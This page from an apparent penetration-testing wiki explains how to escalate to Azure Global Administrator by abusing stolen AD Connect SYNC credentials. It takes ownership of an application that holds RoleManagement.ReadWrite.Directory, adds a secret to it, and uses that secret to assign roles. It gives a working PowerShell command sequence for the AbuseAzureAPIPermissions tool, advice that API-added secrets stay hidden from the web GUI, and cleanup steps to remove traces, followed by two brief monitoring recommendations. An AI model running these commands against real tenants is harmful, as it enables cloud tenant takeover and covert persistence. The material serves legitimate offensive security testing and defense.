---
layout: default
title: Applications Rights Abuse
parent: Azure
nav_order: 1
permalink: /azure/apps/
---

# Applications Rights Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Once you extracted [synchronization credentials](/azure/sync/) from AD Connect server, you can know leverage misconfigured Azure applications with excessive rights to escalate your privileges to Global Administrator.

As explained in this [article](https://cloudbrothers.info/prem-global-admin-password-reset/), `SYNC` account is by default member of *Directory Synchronization Accounts* role, which gives rights to update owners of any application. Note that being owner of an application, you can add secrets to it, allowing you to authenticate with on Azure.

If you find an application with *RoleManagement.ReadWrite.Directory* permission, allowing the application to modify user roles, you could:
1. Put a principal you own as owner of this application.
2. Use this principal to add a new secret to the application.
3. Use this secret to impersonate the application.
4. Leverage *RoleManagement.ReadWrite.Directory* permission to add any user in *Global Administrator* group.

## Prerequisites

* Having extracted [synchronization credentials](/azure/sync/) from AD Connect server.

## Exploit

To perform steps explained above, use [AbuseAzureAPIPermissions](https://github.com/Hagrid29/AbuseAzureAPIPermissions).

{: .important }
> Secrets you add to an application using Microsoft API do not appear in Azure Web GUI. **Don't forget to clean them.* 

```powershell
Import-Module .\AbuseAzureAPIPermissions.ps1
Install-Module Az

# Login on Azure as SYNC.
Get-AAATokenFromAzLogin

# Search for applications with RoleManagement.ReadWrite.Directory permission.
Find-AAAInterestingDirectoryRoleAssignment -ServicePrinciple

# Add a secret to such an application.
New-AAAAppPassword -ServicePrinciple -AppId "$AppId"

# Authenticate as the application using the new secret.
Get-AAATokenFromAzLogin -User "$AppId" -Password "$SecretValue" -TenantId "$TenantId" -ServicePrincipal

# Add a user in Global Administrator group.
$GlobalAdminTemplateId = "62e90394-69f5-4237-9190-012177145e10"
Set-AAADirectoryRoleMember -RoleTemplateId $GlobalAdminTemplateId -TargetObjectId $UserToPrivEsc

# To clean your mess.
Remove-AAADirectoryRoleMember -RoleTemplateId $GlobalAdminTemplateId -TargetObjectId $UserToPrivEsc
Remove-AAAAppPassword -ServicePrinciple -AppId "$AppId" -KeyId "$KeyId"
```

## Recommendations

- [ ] Monitor `SYNC` account usage, detecting request from somewhere else than the AD Connect server.
- [ ] Monitor Global Administrator group to detect modifications.